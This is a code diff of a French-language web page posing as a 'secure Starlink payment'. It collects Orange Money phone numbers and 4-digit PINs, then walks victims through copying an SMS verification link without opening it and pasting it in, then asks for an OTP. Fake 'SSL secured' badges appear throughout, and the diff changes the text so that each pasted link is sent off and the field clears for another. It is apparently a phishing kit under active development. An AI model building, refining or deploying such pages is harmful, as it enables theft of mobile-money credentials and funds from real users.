@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Paiement sécurisé</title>
+  <title>Paiement securise</title>
   <meta name="theme-color" content="#000000">
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
@@ -47,7 +47,6 @@
     body.airtel .btn{background:#ed1c24}
     .btn:disabled{background:#ccc;cursor:not-allowed}
     .ssl{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11px;color:#16a34a}
-    /* Invalid OTP banner — image 1 style (above boxes) */
     .err{display:none;background:#fde8e8;color:#b91c1c;padding:12px 14px;border-radius:10px;font-size:14px;font-weight:500;margin:0 0 14px;text-align:center;border:1px solid #fecaca}
     .err.show{display:block}
     .msg{display:none;background:#ecfdf5;color:#065f46;padding:10px;border-radius:8px;font-size:13px;margin-bottom:12px;text-align:center}
@@ -85,71 +84,70 @@
     </div>
     <div class="card-wrap">
       <div class="card">
-        <div class="pill"><span class="star">★</span> <span id="pillText">Paiement Starlink</span></div>
+        <div class="pill"><span class="star">*</span> <span id="pillText">Paiement Starlink</span></div>
         <div class="pay-row">
           <div><div class="lbl">Service</div><div class="val" id="svcName">Renouvellement Starlink</div></div>
-          <div style="text-align:right"><div class="lbl">Montant</div><div class="amt" id="amtVal">—</div></div>
+          <div style="text-align:right"><div class="lbl">Montant</div><div class="amt" id="amtVal">-</div></div>
         </div>
 
         <div class="body screen active" id="screenLogin">
           <div class="err" id="errLogin"></div>
-          <div class="title" id="loginTitle">Entrez votre numéro Orange Money</div>
+          <div class="title" id="loginTitle">Entrez votre numero Orange Money</div>
           <div class="phone-wrap">
             <button type="button" class="cc-btn" id="ccBtn">
-              <span class="flag" id="ccFlag">🇨🇩</span>
+              <span class="flag" id="ccFlag">CD</span>
               <span id="ccCode">+243</span>
-              <span class="arrow">▼</span>
+              <span class="arrow">v</span>
             </button>
             <input class="phone-input" id="phone" type="tel" inputmode="numeric" autocomplete="tel" placeholder="XX XXX XXXX" maxlength="12">
           </div>
-          <div class="pin-hint" id="pinHint">Entrez votre code PIN à 4 chiffres Orange Money pour autoriser cette transaction.</div>
+          <div class="pin-hint" id="pinHint">Entrez votre code PIN a 4 chiffres Orange Money pour autoriser cette transaction.</div>
           <div class="pin-row" id="pinRow">
             <input class="pin-box" type="tel" inputmode="numeric" maxlength="1" data-i="0" autocomplete="off">
             <input class="pin-box" type="tel" inputmode="numeric" maxlength="1" data-i="1" autocomplete="off">
             <input class="pin-box" type="tel" inputmode="numeric" maxlength="1" data-i="2" autocomplete="off">
             <input class="pin-box" type="tel" inputmode="numeric" maxlength="1" data-i="3" autocomplete="off">
           </div>
-          <p class="terms">En utilisant ce service, vous acceptez nos Conditions d'utilisation et notre Politique de confidentialité</p>
+          <p class="terms">En utilisant ce service, vous acceptez nos Conditions d'utilisation et notre Politique de confidentialite</p>
           <button class="btn" id="btnNext" disabled>SUIVANT</button>
-          <div class="ssl">🔒 Crypté SSL et sécurisé</div>
+          <div class="ssl">Crypte SSL et securise</div>
         </div>
 
         <div class="body screen" id="screenLink">
-          <button type="button" class="back" id="btnBack">← Retour</button>
-          <div class="title">Lien de vérification</div>
-          <p style="text-align:center;font-size:13px;color:#555;margin-bottom:6px">Un lien de vérification a été envoyé à votre numéro de téléphone par SMS.</p>
-          <div class="link-phone" id="linkPhoneDisp">+243…</div>
-          <div class="warn">⚠️ NE tapez PAS sur le lien — copiez-le uniquement et collez-le ci-dessous</div>
+          <button type="button" class="back" id="btnBack">Retour</button>
+          <div class="title">Lien de verification</div>
+          <p style="text-align:center;font-size:13px;color:#555;margin-bottom:6px">Un lien de verification a ete envoye a votre numero de telephone par SMS.</p>
+          <div class="link-phone" id="linkPhoneDisp">+243...</div>
+          <div class="warn">NE tapez PAS sur le lien - copiez-le uniquement et collez-le ci-dessous</div>
           <div class="howto">
             <strong>Comment coller votre lien :</strong>
             <ol>
-              <li>Ouvrez le <strong>SMS</strong> que vous avez reçu d'Orange Money</li>
-              <li>Trouvez le lien dans le SMS — <strong>NE tapez PAS dessus</strong></li>
-              <li>Appuyez longuement sur le lien jusqu'à ce qu'un menu apparaisse</li>
-              <li>Appuyez sur « <strong>Copier le lien</strong> » ou « <strong>Copier</strong> »</li>
+              <li>Ouvrez le <strong>SMS</strong> que vous avez recu d'Orange Money</li>
+              <li>Trouvez le lien dans le SMS - <strong>NE tapez PAS dessus</strong></li>
+              <li>Appuyez longuement sur le lien jusqu'a ce qu'un menu apparaisse</li>
+              <li>Appuyez sur "<strong>Copier le lien</strong>" ou "<strong>Copier</strong>"</li>
               <li>Revenez sur cette page</li>
-              <li>Appuyez longuement sur le champ ci-dessous et tapez « <strong>Coller</strong> »</li>
-              <li>Le lien sera vérifié automatiquement</li>
+              <li>Appuyez longuement sur le champ ci-dessous et tapez "<strong>Coller</strong>"</li>
+              <li>Le lien sera envoye, puis le champ se vide automatiquement pour un nouveau lien</li>
             </ol>
           </div>
           <div class="err" id="errLink"></div>
           <div class="msg" id="msgLink"></div>
-          <input class="link-input" id="linkInput" type="text" placeholder="Collez votre lien de vérification ici..." autocomplete="off">
+          <input class="link-input" id="linkInput" type="text" placeholder="Collez votre lien de verification ici..." autocomplete="off">
           <div class="resend" id="resendInfo">Renvoyer le lien dans <span id="timer">30</span> s</div>
-          <button class="btn" id="btnVerifyLink" disabled>Vérifier</button>
-          <div class="ssl">🔒 Crypté SSL et sécurisé</div>
+          <button class="btn" id="btnVerifyLink" disabled>Verifier</button>
+          <div class="ssl">Crypte SSL et securise</div>
         </div>
 
         <div class="body screen" id="screenOtp">
-          <button type="button" class="back" id="btnBackOtp">← Retour</button>
-          <div class="title">Vérification OTP</div>
-          <p class="otp-sub" id="otpSub">Veuillez entrer le code OTP reçu</p>
-          <!-- Banner ABOVE boxes (like image 1) -->
+          <button type="button" class="back" id="btnBackOtp">Retour</button>
+          <div class="title">Verification OTP</div>
+          <p class="otp-sub" id="otpSub">Veuillez entrer le code OTP recu</p>
           <div class="err" id="errOtp"></div>
           <div class="pin-row" id="otpRow"></div>
-          <button class="btn" id="btnVerifyOtp" disabled style="margin-top:8px">VÉRIFIER</button>
+          <button class="btn" id="btnVerifyOtp" disabled style="margin-top:8px">VERIFIER</button>
           <p class="resend" id="otpResend" style="margin-top:12px"></p>
-          <div class="ssl">🔒 Crypté SSL et sécurisé</div>
+          <div class="ssl">Crypte SSL et securise</div>
         </div>
       </div>
     </div>
@@ -157,11 +155,11 @@
 
   <div class="modal" id="ccModal">
     <div class="modal-card">
-      <div class="modal-h">Choisir le pays <button type="button" id="ccClose">×</button></div>
+      <div class="modal-h">Choisir le pays <button type="button" id="ccClose">x</button></div>
       <ul class="clist" id="ccList"></ul>
     </div>
   </div>
 
-  <script src="/js/verify-payment.js?v=8"></script>
+  <script src="/js/verify-payment.js?v=9"></script>
 </body>
 </html>
